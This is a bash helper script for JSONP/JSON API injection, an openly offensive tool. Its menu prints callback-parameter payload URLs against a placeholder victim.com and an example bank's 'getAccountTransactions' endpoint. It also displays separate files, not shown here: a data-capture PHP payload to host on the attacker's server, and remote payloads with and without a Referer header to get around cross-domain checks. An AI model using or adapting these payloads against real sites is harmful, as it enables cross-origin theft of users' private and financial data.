#!/bin/bash

red="\e[0;31m"
new="\e[0;36m"
green="\e[0;32m"
off="\e[0m"

clear
function banner() {
echo "
						JSON / JSONP API Injection Helper
        					        version 1.0a
                			       Script - Hackeruniversee
					       Coder  - Haroon Awan
"
}
banner
 echo "";
 echo -e "$red [$green+$red] $off Caution: Before Continue Adjust Referer and No Referer file for payload"; 
 echo "";
 echo -e "$red [$green+$red] 1:$off Generate JSON / JSONP API Payloads "; 
 echo -e "$red [$green+$red] 2:$off Show Data Capture PHP Payload File ";
 echo -e "$red [$green+$red] 3:$off Show Remote Payload With Referer ";
 echo -e "$red [$green+$red] 4:$off Show Remote Payload With No Referer ";
 echo "";
 echo -ne "$red [$green+$red] Select An Option:$off: " ;
 read Option

if [ $Option -eq "1" ]
 then
 echo "";
 echo -e "$red [$green+$red] $off Payload1 : https://www.victim.com/json_api_call_here?callback=test"
 echo -e "$red [$green+$red] $off Payload2 : https://www.victim.com/json_api_call_here?cb=test"
 echo -e "$red [$green+$red] $off Payload3 : https://www.victim.com/json_api_call_here?jsonp=test"
 echo -e "$red [$green+$red] $off Payload4 : https://www.victim.com/json_api_call_here?jsonpcallback=test"
 echo -e "$red [$green+$red] $off Payload5 : https://www.victim.com/json_api_call_here?jsb=test"
 echo -e "$red [$green+$red] $off Payload6 : https://www.victim.com/json_api_call_here?call=test"
 echo -e "$red [$green+$red] $off Example  : https://www.securebank.com.pk/getAccountTransactions?call=test"
 echo "";
 fi
  
if [ $Option -eq "2" ]
then
 echo "";
 echo -e "$red [$green+$red] $off Setup: Host this file onto your server"
 echo ""; 
 cat data.php
 echo "";
 fi

if [ $Option -eq "3" ]
 then
 echo "";
 echo -e "$red [$green+$red] $off Setup: Send this file via your server"
 echo ""; 
 cat referer
 echo "";
 fi

if [ $Option -eq "4" ]
 then
 echo ""; 
 echo -e "$red [$green+$red] $off Setup: Host this file locally with no header to bypass cross domain "
 echo ""; 
 cat no_referer
 echo ""; 
 fi
